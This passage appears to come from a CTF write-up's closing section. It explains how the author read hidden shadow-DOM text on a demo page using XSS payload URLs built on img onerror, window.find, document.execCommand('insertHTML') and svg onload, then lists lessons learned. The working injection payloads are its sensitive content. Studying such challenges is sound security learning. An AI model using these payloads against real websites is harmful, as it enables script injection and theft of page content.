The first key point is to focus on the text first before executing insertHTML. I had tried `.focus()` before, but it didn't work. The second key point is to use svg to succeed.

Here is the successful payload:

```
https://aszx87410.github.io/demo/misc/shadow.html?y=-webkit-user-modify:+read-write&x=<img+src=x+onerror="find('steal me');document.execCommand('insertHTML',false,'<svg/onload=alert(this.parentNode.innerHTML)>')">
```

First, use `window.find` to focus on the content, then execute `document.execCommand` to insert HTML, and then use the `svg` event to execute JS to get the node.

Here are some payloads that will fail:

```
// 沒有 focus
https://aszx87410.github.io/demo/misc/shadow.html?y=-webkit-user-modify:+read-write&x=<img+src=x+onerror="document.execCommand('insertHTML',false,'<svg/onload=alert(this.parentNode.innerHTML)>')">

// 用了不是 svg 的元素，會讀不到 this.parentNode
https://aszx87410.github.io/demo/misc/shadow.html?y=-webkit-user-modify:+read-write&x=<img+src=x+onerror="find('steal me');document.execCommand('insertHTML',false,'<img/src=x+onerror=alert(this.parentNode.innerHTML)>')">
```

But the magical thing is that if you first add `document.exec('selectAll')` at the beginning, it works:

```
https://aszx87410.github.io/demo/misc/shadow.html?y=-webkit-user-modify:+read-write&x=<img+src=x+onerror="find('steal me');document.execCommand('selectAll');document.execCommand('insertHTML',false,'<img/src=x+onerror=alert(this.parentNode.parentNode.innerHTML)>')">
```

Why is there this difference? I don't know, and the people who solved it don't seem to know either XD

In addition to learning about the magical API [window.find](https://developer.mozilla.org/en-US/docs/Web/API/Window/find), I also learned about another hidden API from the post-event discussion on Discord: `document.execCommand('findString', false, 'steal')`, which they said they saw in the Chromium source code: https://chromium.googlesource.com/chromium/src/+/refs/tags/100.0.4875.3/third_party/blink/renderer/core/editing/commands/editor_command_names.h#35

Here are three things to look into in the future:

1. Study all the commands that `document.execCommand` can execute.
2. Study all global functions.
3. Study all CSS properties supported by Chrome.

## Conclusion

Although I only solved 1 web question out of 10, I still gained a lot. Here are some new things I learned:

1. Node.js wraps modules in functions.
2. You can't use `import "fs"`, but you can use `import("fs").then()`.
3. Some characters in JS change length after being converted to uppercase or lowercase.
4. `RegExp.input`, also known as `RegExp.$_`, can be used to get the last input that was compared.
5. `<svg><svg onload=alert()>` is executed synchronously, which is really amazing.
6. You can fill the connection pool to execute a timing attack.
7. `-webkit-user-modify` can do similar things to `contenteditable`.
8. `window.find` and `document.execCommand('findString', false, 'steal')` can highlight the corresponding string.

"I feel that the techniques I learned this time will also be very useful in other CTF competitions."
